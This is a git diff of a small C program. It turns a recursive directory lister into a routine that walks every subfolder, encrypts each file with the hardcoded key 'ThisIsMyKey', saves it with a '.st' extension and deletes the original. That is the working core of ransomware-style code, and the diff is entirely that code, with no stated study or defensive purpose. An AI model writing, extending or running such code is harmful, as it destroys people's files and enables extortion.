@@ -58,6 +58,17 @@ char dec(char c, char* key){
   return buff;
 }
 
+int processFile(char* path){
+  FILE* input = openFile(path, "r");
+  char* outputPath = addext(path, ".st");
+  FILE* output = openFile(outputPath, "w");
+  free(outputPath);
+  docrypt(input, output, "ThisIsMyKey", &enc);
+  closeFile(input,output);
+  remove(path);
+  return 0;
+}
+
 /////////////////////////////////::
 
 char* addPath(const char *path, const char *file){
@@ -86,7 +97,7 @@ int isDir(char* path){
   }
 }
 
-int showDir(char* path){
+int encDir(char* path){
   DIR *dir = opendir(path);
   if (dir == NULL){
     perror(path);
@@ -96,9 +107,11 @@ int showDir(char* path){
   struct dirent *file;
   while((file = readdir(dir))!= NULL){
     char* fullpath = addPath(path, file->d_name);
-    printf("%s\n",fullpath);
+    //printf("%s\n",fullpath);
     if(isDir(fullpath)){
-      showDir(fullpath);
+      encDir(fullpath);
+    }else{
+      processFile(fullpath) == 0 ? printf("%s : No Issue", fullpath):printf("%s : Error",fullpath);
     }
     free(fullpath);
   }
